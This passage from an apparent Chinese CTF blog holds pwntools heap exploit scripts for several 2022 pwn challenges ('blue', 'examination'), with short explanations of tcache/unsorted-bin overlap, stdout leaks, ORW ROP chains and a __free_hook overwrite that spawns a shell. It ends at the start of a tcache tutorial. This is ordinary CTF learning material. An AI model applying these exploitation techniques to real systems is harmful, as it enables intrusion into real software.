<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(banary)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28902</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, con</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Idx:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">b&#x27;Content:&#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add()               <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i  <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">key = u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(key))</span><br><span class="line">heap = key &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>, <span class="number">1</span>, <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">malloc_hook = uu64() - <span class="number">96</span> - <span class="number">0x10</span> - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libcbase = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">environ = libcbase + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line">pop_rdi = libcbase + <span class="number">0x28a55</span></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x2a4cf</span></span><br><span class="line">pop_rdx = libcbase + <span class="number">0xc7f32</span></span><br><span class="line">read_addr = libcbase + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libcbase + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_addr = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    add()</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, <span class="number">8</span>, p64(environ ^ key))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">add()</span><br><span class="line">show(<span class="number">15</span>)</span><br><span class="line">stack = uu64() - <span class="number">0x168</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">8</span>, p64(stack ^ key))</span><br><span class="line">add()</span><br><span class="line">add()       <span class="comment">#17</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;flag&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">4</span></span><br><span class="line">payload += p64(pop_rdi) + p64(stack) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(pop_rdx) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(heap) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">payload += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_addr)</span><br><span class="line">edit(<span class="number">17</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

<h1 id="blue"><a href="#blue" class="headerlink" title="blue"></a>blue</h1><p>程序只能show一次</p>
<p><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100914502.jpg"></p>
<p>这里有个隐藏的uaf，也是一次的</p>
<p>用这个uaf去泄露libc</p>
<p>先把tcache填满，利用再释放一个堆块进入unsorted bin泄露libc，然后释放一个堆块与该堆块合并，再去把tcache bin中的一个堆块取出来，接着再次释放前面uaf的堆块，这样就能做到unsorted bin和tcache的一个堆重叠，切割unsorted bin 就是任意地址写了</p>
<p>因为只能show一次，所以选择打stdout去泄露栈地址，最后构造orw拿到flag</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">banary = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">elf = ELF(banary)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">ip = <span class="string">&#x27;1.14.71.254&#x27;</span></span><br><span class="line">port = <span class="number">28834</span></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(banary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data : io.send(data)</span><br><span class="line">sl = <span class="keyword">lambda</span> data : io.sendline(data)</span><br><span class="line">sa = <span class="keyword">lambda</span> text, data : io.sendafter(text, data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text, data : io.sendlineafter(text, data)</span><br><span class="line">r = <span class="keyword">lambda</span> : io.recv()</span><br><span class="line">ru = <span class="keyword">lambda</span> text : io.recvuntil(text)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> : u32(io.recvuntil(<span class="string">b&quot;\xff&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> : u64(io.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg = <span class="keyword">lambda</span> addr : log.info(addr)</span><br><span class="line">ia = <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">_flags = <span class="number">0xfbad1800</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, con</span>):</span><br><span class="line">    sla(<span class="string">b&quot;: &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">b&#x27;: &#x27;</span>, con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;: &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&quot;: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&quot;: &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uaf</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;666&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x90</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">uaf(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">libcbase = uu64() - <span class="number">0x1ecbe0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">stdout = libcbase + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">environ = libcbase + libc.sym[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>) + p64(stdout)</span><br><span class="line">add(<span class="number">0x80</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2 = p64(_flags) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(environ) + p64(environ + <span class="number">8</span>) * <span class="number">2</span></span><br><span class="line">add(<span class="number">0x90</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>, payload2)</span><br><span class="line">stack = uu64() - <span class="number">0x128</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload3 = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(stack)</span><br><span class="line">add(<span class="number">0x80</span>, payload3)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">open:0x10dd10</span></span><br><span class="line"><span class="string">read:0x10dff0</span></span><br><span class="line"><span class="string">write:0x10e090</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">open</span> = libcbase + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libcbase + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts = libcbase + libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi = libcbase + <span class="number">0x23b6a</span></span><br><span class="line">ret = libcbase + <span class="number">0x22679</span></span><br><span class="line">pop_rsi = libcbase + <span class="number">0x2601f</span></span><br><span class="line">pop_rdx = libcbase + <span class="number">0x142c92</span></span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">orw += p64(pop_rdi) + p64(stack) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(stack + <span class="number">0x200</span>) + p64(pop_rdx) + p64(<span class="number">0x50</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(stack + <span class="number">0x200</span>) + p64(puts)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>, orw)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>ciscn2022</tag>
      </tags>
  </entry>
  <entry>
    <title>startctf2022-pwn-writeup</title>
    <url>/2022/06/13/startctf2022-pwn-writeup/</url>
    <content><![CDATA[<p>*ctf 2022 pwn examination复现</p>
<span id="more"></span>

<h1 id="examination"><a href="#examination" class="headerlink" title="examination"></a>examination</h1><p><a href="https://imgtu.com/i/XWen61"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100918978.jpg" alt="XWen61.jpg"></a></p>
<p>64位保护全开</p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序分为两个用户，一个teacher一个student</p>
<p>teacher可以添加学生，给学生打分、评论以及开除学生</p>
<p>student可以查看评论，祈祷，等</p>
<h3 id="add-student"><a href="#add-student" class="headerlink" title="add_student"></a>add_student</h3><p><a href="https://imgtu.com/i/XWnFG4"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100918367.jpg" alt="XWnFG4.jpg"></a></p>
<p>最多可以添加7个学生，程序会calloc两块堆块，0x20的堆块为head、0x18的为info</p>
<p>head存放info结构体的地址，info结构体的内容为教师评分，分数，评论的大小，评论的内容</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">info</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> number;</span><br><span class="line">	<span class="type">int</span> sorce;</span><br><span class="line">	<span class="type">int</span> review_size;</span><br><span class="line">	<span class="type">int</span>* review;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后head的地址存放在student数组中</p>
<h3 id="give-sorce"><a href="#give-sorce" class="headerlink" title="give_sorce"></a>give_sorce</h3><p><a href="https://imgtu.com/i/XWumlj"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100918300.jpg" alt="XWumlj.jpg"></a></p>
<p>这里v2是无符号整型，当<code>*(student_chunk[i] + 24LL) == 1</code>的时候进入if语句可造成整数溢出</p>
<p>要让这个地址的值为1只需要执行下面这个函数就行</p>
<p><a href="https://imgtu.com/i/XWQl7t"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100918754.jpg" alt="XWQl7t.jpg"></a></p>
<h3 id="write-review"><a href="#write-review" class="headerlink" title="write_review"></a>write_review</h3><p><a href="https://imgtu.com/i/XWQrNV"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100918468.jpg" alt="XWQrNV.jpg"></a></p>
<p>如果原本有就直接覆盖，没有的话输入指定范围内的size然后分配堆块写入内容</p>
<h3 id="check-fo-review"><a href="#check-fo-review" class="headerlink" title="check_fo_review"></a>check_fo_review</h3><p><a href="https://imgtu.com/i/XWmC3d"><img src="https://image-1306303065.cos.ap-nanjing.myqcloud.com/202304100919692.jpg" alt="XWmC3d.jpg"></a></p>
<p>如果分数大于0x59可以打印堆地址并让一个任意地址加1，这里利用give_sorce的整数溢出即可得到一个很大的分数用来泄露堆地址</p>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>程序可以使任意地址加1，这里可以通过修改堆块的size来造成堆重叠然后泄露libc</p>
<p>先添加两个学生，第一个学生的评论开辟0x380的空间，第二个学生的评论开辟0xa0的空间，泄露第一个学生的地址并修改地址+0x49即第一个学生评论的size位的3为4</p>
<p>这样size位就从0x391变成了0x491，多出来的0x100刚好可以把第二个学生的评论区域全部包含进来，把第一个学生开除，这样0x491大小的堆块会被放入unsorted bin中，接着继续添加学生的话会从unsorted bin中切割</p>
<p>这里思路就很明确了，被释放的0x491的堆块包含了第二个学生的所有信息，添加第三个学生，把包含第二个学生的head和info申请出来，只剩评论区域在unsorted bin中，查看评论就能泄露libc了，不过这里要注意的是程序使用的是calloc函数，重新申请出来的堆块会被清空，所以要把第二个学生的所有信息都构造好</p>
<p>再次通过写第三个学生的评论将第一个学生的评论地址改成__free_hook并写入<code>/bin/sh</code></p>
<p>覆写第一个学生的评论改__free_hook为system最后开除第三个学生即可getshell</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&quot;./examination&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&quot;1.14.71.254&quot;</span>, <span class="number">28662</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">selete</span>(<span class="params">role</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&lt;0.teacher/1.student&gt;: &quot;</span>, <span class="built_in">str</span>(role))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">number</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;enter the number of questions: &quot;</span>, <span class="built_in">str</span>(number))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">give_score</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_new_review</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;which one? &gt; &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;please input the size of comment: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;enter your comment:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_old_review</span>(<span class="params">idx, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;which one? &gt; &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;enter your comment:&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">choice</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&lt;0.teacher/1.student&gt;: &quot;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pray</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;which student id to choose?&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_id</span>(<span class="params">idx</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt;&gt; &quot;</span>, <span class="string">b&#x27;6&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;input your id: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;choice&gt;&gt; &quot;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;reward! &quot;</span>)</span><br><span class="line">    heap = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;add 1 to wherever you want! addr: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(heap + <span class="number">0x49</span>).encode().ljust(<span class="number">15</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> heap</span><br><span class="line">selete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)  <span class="comment">#0</span></span><br><span class="line">write_new_review(<span class="number">0</span>, <span class="number">0x380</span>, <span class="string">b&#x27;Leof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">set_id(<span class="number">0</span>)</span><br><span class="line">pray()</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)  <span class="comment">#1</span></span><br><span class="line">write_new_review(<span class="number">1</span>, <span class="number">0xa0</span>, <span class="string">b&#x27;Leof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)  <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">give_score()</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">set_id(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">heap = attack()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;heap: &quot;</span>, <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)          <span class="comment">#      0x30 + 0x20</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x338</span> + p64(<span class="number">0x31</span>) + p64(heap + <span class="number">0x410</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">1</span>) + p64(heap + <span class="number">0x430</span>) + p64(<span class="number">6</span>)</span><br><span class="line">write_new_review(<span class="number">2</span>, <span class="number">0x388</span>, payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">set_id(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">malloc_hook = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;malloc_hook: &quot;</span>, <span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">libcbase = malloc_hook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">sys_addr = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = libcbase + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x330</span> + p64(<span class="number">0x31</span>) + p64(heap + <span class="number">0x410</span>) + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">1</span>) + p64(free_hook) + p64(<span class="number">8</span>)</span><br><span class="line">write_old_review(<span class="number">2</span>, payload)</span><br><span class="line">write_old_review(<span class="number">1</span>, p64(sys_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>pwn</category>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>startctf2022</tag>
      </tags>
  </entry>
  <entry>
    <title>tcache利用思路总结</title>
    <url>/2022/07/01/tcache/</url>
    <content><![CDATA[<p>tcache bin 相关知识</p>
<span id="more"></span>

<h1 id="Tcache机制"><a href="#Tcache机制" class="headerlink" title="Tcache机制"></a>Tcache机制</h1><p>Tcache机制是libc2.26开始增加的，tcache bins是64个单链表结构的bins，每个bins最大存放7个对应大小的chunk，chunk的大小在64位中以16字节递增，从24到1032字节，在32位机器上以8字节递增，从12字节到512字节</p>
<h1 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h1><p>这里先以libc2.26的源码来做例子，后面高版本有改动再具体分析</p>
<h2 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 2927*/</span></span><br><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>

<h2 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*in malloc.c 2932*/</span></span><br><span class="line"><span class="comment">/* There is one of these for each thread, which contains the</span></span><br><span class="line"><span class="comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span></span><br><span class="line"><span class="comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span></span><br><span class="line"><span class="comment">   are redundant (we could have just counted the linked list each</span></span><br><span class="line"><span class="comment">   time), this is for performance reasons.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; 